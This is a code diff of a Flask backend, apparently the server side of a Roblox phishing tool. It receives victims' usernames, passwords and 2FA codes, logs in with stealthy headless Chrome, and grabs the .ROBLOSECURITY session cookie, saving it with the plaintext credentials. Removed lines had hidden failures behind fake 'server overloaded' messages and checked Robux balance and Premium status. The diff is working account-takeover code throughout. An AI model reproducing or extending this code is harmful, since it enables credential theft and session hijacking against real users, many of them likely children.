@@ -11,9 +11,9 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.action_chains import ActionChains
 from webdriver_manager.chrome import ChromeDriverManager
-from selenium.common.exceptions import WebDriverException, TimeoutException, NoSuchElementException
+from selenium.common.exceptions import (WebDriverException, TimeoutException, 
+                                      NoSuchElementException)
 import git
 import json
 from flask_cors import CORS
@@ -21,13 +21,6 @@ import subprocess
 
 app = Flask(__name__)
 CORS(app)
-
-@app.after_request
-def after_request(response):
-    response.headers.add('Access-Control-Allow-Origin', '*')
-    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
-    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
-    return response
 
 # Конфигурация
 ORDERS_REPO = f"https://github.com/{os.getenv('GITHUB_USERNAME')}/base.git"
@@ -46,7 +39,6 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger(__name__)
-
 
 def generate_filename():
     """Генерирует имя файла"""
@@ -106,25 +98,7 @@ def human_like_delay(min_sec=0.1, max_sec=0.5):
 def get_chrome_options():
     """Configure Chrome options for Docker environment"""
     options = Options()
-    
-    # Стандартный путь к Chrome в Docker
-    chrome_path = "/usr/bin/google-chrome"
-    
-    if not os.path.exists(chrome_path):
-        raise RuntimeError(f"Chrome not found at {chrome_path}. Docker setup may be incorrect.")
-    
-    options.binary_location = chrome_path
-    
-    # Получаем версию Chrome
-    try:
-        version_output = subprocess.check_output([chrome_path, "--version"]).decode().strip()
-        chrome_version = version_output.split()[2]  # "Google Chrome 119.0.6045.105"
-        logger.info(f"Using Chrome version: {chrome_version}")
-    except Exception as e:
-        logger.error(f"Could not get Chrome version: {str(e)}")
-        chrome_version = "119.0.6045.105"  # Fallback version
-    
-    # Настройки Chrome
+    options.binary_location = "/usr/bin/google-chrome"
     options.add_argument("--headless=new")
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
@@ -134,71 +108,107 @@ def get_chrome_options():
     options.add_argument("--disable-blink-features=AutomationControlled")
     options.add_experimental_option("excludeSwitches", ["enable-automation"])
     options.add_experimental_option("useAutomationExtension", False)
-    
-    # User agent с правильной версией
-    options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36")
-    
     return options
 
 def process_login(username, password, code_2fa=None):
+    """Handle login with version-matched ChromeDriver"""
     driver = None
     try:
         chrome_options = get_chrome_options()
-        
-        # Установка ChromeDriver
-        try:
-            chrome_version = subprocess.check_output([chrome_options.binary_location, "--version"]).decode().split()[2]
-            major_version = chrome_version.split('.')[0]
-            service = Service(ChromeDriverManager(version=major_version).install())
-        except Exception as e:
-            logger.error(f"ChromeDriver setup failed: {str(e)}")
-            return {'status': 'critical_error', 'message': 'Browser setup failed'}
-
+        service = Service(ChromeDriverManager().install())
         driver = webdriver.Chrome(service=service, options=chrome_options)
         
-        # Остальная часть вашей функции...
+        driver.get("https://www.roblox.com/login")
+        human_like_delay(1, 2)
         
+        # Accept cookies if present
+        try:
+            cookie_btn = WebDriverWait(driver, 3).until(
+                EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Accept')]")))
+            cookie_btn.click()
+            human_like_delay()
+        except:
+            pass
+        
+        # Fill username and password
+        username_field = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.ID, "login-username")))
+        username_field.send_keys(username)
+        human_like_delay()
+        
+        password_field = driver.find_element(By.ID, "login-password")
+        password_field.send_keys(password)
+        human_like_delay()
+        
+        login_btn = driver.find_element(By.ID, "login-button")
+        login_btn.click()
+        human_like_delay(2, 3)
+        
+        # Check for 2FA
+        if not code_2fa:
+            try:
+                WebDriverWait(driver, 3).until(
+                    EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
+                return {'status': '2fa_required', 'message': '2FA verification required'}
+            except TimeoutException:
+                pass
+        
+        # Handle 2FA if code provided
+        if code_2fa:
+            try:
+                code_field = WebDriverWait(driver, 5).until(
+                    EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
+                code_field.send_keys(code_2fa)
+                human_like_delay()
+                
+                submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Verify')]")
+                submit_btn.click()
+                human_like_delay(2, 3)
+            except Exception as e:
+                return {'status': '2fa_error', 'message': f'Invalid 2FA code: {str(e)}'}
+        
+        # Check for successful login
+        try:
+            WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar-container')]")))
+            
+            account_data = {
+                'username': username,
+                'password': password,
+                'status': 'active',
+                'cookie': driver.get_cookie('.ROBLOSECURITY')['value'] if driver.get_cookie('.ROBLOSECURITY') else None,
+                'timestamp': datetime.now().isoformat()
+            }
+            
+            return {'status': 'success', 'data': account_data}
+            
+        except TimeoutException:
+            error_msg = check_for_errors(driver)
+            if error_msg:
+                return {'status': 'error', 'message': error_msg}
+            return {'status': 'unknown_error', 'message': 'Login failed'}
+            
     except Exception as e:
-        logger.error(f"Error: {str(e)}")
+        logger.error(f"Critical error: {str(e)}")
         return {'status': 'critical_error', 'message': str(e)}
     finally:
         if driver:
             driver.quit()
 
-def get_robux_balance(driver):
-    """Получает баланс Robux"""
-    try:
-        driver.get("https://www.roblox.com/transactions")
-        balance = WebDriverWait(driver, 5).until(
-            EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'robux-balance')]"))).text
-        return balance.strip()
-    except:
-        return "0"
-
-def check_premium_status(driver):
-    """Проверяет наличие Premium"""
-    try:
-        driver.get("https://www.roblox.com/premium/membership")
-        WebDriverWait(driver, 5).until(
-            EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'premium-icon')]")))
-        return True
-    except:
-        return False
-
 def check_for_errors(driver):
     """Проверяет наличие сообщений об ошибках"""
-    error_messages = [
-        "incorrect username or password",
-        "неверное имя пользователя или пароль",
-        "account locked",
-        "требуется проверка",
-        "verification required"
-    ]
+    error_messages = {
+        "incorrect username or password": "Incorrect username or password",
+        "неверное имя пользователя или пароль": "Incorrect username or password",
+        "account locked": "Account locked",
+        "требуется проверка": "Verification required",
+        "verification required": "Verification required"
+    }
     
     page_text = driver.page_source.lower()
-    for msg in error_messages:
+    for msg, display_msg in error_messages.items():
         if msg in page_text:
-            return msg.capitalize()
+            return display_msg
     
     return None
 
@@ -212,9 +222,6 @@ def health_check():
 
 @app.route('/process_login', methods=['POST'])
 def handle_login():
-    if request.method == 'OPTIONS':
-        return jsonify({'status': 'ok'}), 200
-
     if not request.is_json:
         return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
     
@@ -237,28 +244,24 @@ def handle_login():
         if result['status'] == 'success':
             if not save_account_data(result['data']):
                 return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
-        
-        # Преобразуем все ошибки в сообщение о перегруженности сервера
-        if result['status'] != 'success':
-            result = {
-                'status': 'server_busy',
-                'message': 'The server is overloaded. Please try later'
-            }
-        
-        return jsonify(result)
-        
+            return jsonify(result)
+        elif result['status'] == '2fa_required':
+            return jsonify(result)
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': result.get('message', 'Login failed. Please try again.')
+            })
+            
     except Exception as e:
         logger.error(f"Server error: {str(e)}")
         return jsonify({
-            'status': 'server_busy',
-            'message': 'The server is overloaded. Please try later'
-        })
+            'status': 'error',
+            'message': 'Server error. Please try again later'
+        }), 500
 
 @app.route('/submit_2fa', methods=['POST'])
 def handle_2fa():
-    if request.method == 'OPTIONS':
-        return jsonify({'status': 'ok'}), 200
-
     if not request.is_json:
         return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
     
@@ -282,26 +285,19 @@ def handle_2fa():
         if result['status'] == 'success':
             if not save_account_data(result['data']):
                 return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
-        
-        # Преобразуем все ошибки в сообщение о перегруженности сервера
-        if result['status'] != 'success':
-            result = {
-                'status': 'server_busy',
-                'message': 'The server is overloaded. Please try later'
-            }
-        
-        return jsonify(result)
-        
+            return jsonify(result)
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': result.get('message', '2FA verification failed')
+            })
+            
     except Exception as e:
         logger.error(f"Server error: {str(e)}")
         return jsonify({
-            'status': 'server_busy',
-            'message': 'The server is overloaded. Please try later'
-        })
-
-@app.before_request
-def log_request():
-    logger.info(f"Incoming request: {request.method} {request.url}")
+            'status': 'error',
+            'message': 'Server error. Please try again later'
+        }), 500
 
 if __name__ == '__main__':
     # Verify environment variables
@@ -312,11 +308,8 @@ if __name__ == '__main__':
             exit(1)
     
     # Create directories
-    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
     os.makedirs(ORDERS_DIR, exist_ok=True)
     
     # Start server
     port = int(os.getenv('PORT', 10000))
     app.run(host='0.0.0.0', port=port)
-
-
